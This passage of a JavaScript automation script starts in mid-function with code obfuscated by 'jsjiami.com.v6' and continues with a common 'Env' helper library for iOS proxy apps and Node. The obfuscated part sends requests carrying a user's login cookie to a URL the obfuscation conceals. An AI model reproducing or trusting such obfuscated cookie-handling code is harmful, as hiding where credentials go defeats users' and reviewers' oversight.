_0x15837a!==_0x1487ee;},'LTTsZ':_0x474f('b0','gPig'),'pEHju':function(_0x10ac98){return _0x10ac98();},'BfWDU':_0x474f('b1','9e0U'),'owRlD':_0x474f('b2','ZsIp')};let _0x189028={'url':$[_0x474f('b3','4Ox^')],'headers':{'Host':_0x5d7133[_0x474f('b4','4d02')],'Connection':_0x5d7133[_0x474f('b5','0]WD')],'Cookie':_0x47b72b,'Referer':$[_0x474f('b6','0]WD')],'User-Agent':$['UA']}};return new Promise(_0x1aca4d=>{var _0x4844c9={'VkKSu':function(_0x199970,_0xe84d17){return _0x5d7133[_0x474f('b7','ZAZc')](_0x199970,_0xe84d17);},'iYkyt':_0x5d7133[_0x474f('b8','x$Qy')],'otziA':function(_0x1d5983){return _0x5d7133[_0x474f('b9','vUZ#')](_0x1d5983);}};$[_0x474f('ba','q0TK')](_0x189028,async(_0x3df335,_0x1b37cf,_0x5d556b)=>{try{if(_0x3df335){}else{if(_0x4844c9[_0x474f('bb','q0TK')](_0x4844c9[_0x474f('bc','$S68')],_0x4844c9[_0x474f('bd','V[xk')])){$[_0x474f('be','2MCt')]();}else{_0x5d556b=JSON[_0x474f('bf','qqZp')](_0x5d556b);await $[_0x474f('c0','hjeu')](0xc8);}}}catch(_0x21c5f5){$[_0x474f('c1','5wk(')]();}finally{_0x4844c9[_0x474f('c2','5wk(')](_0x1aca4d);}});});};_0xodp='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
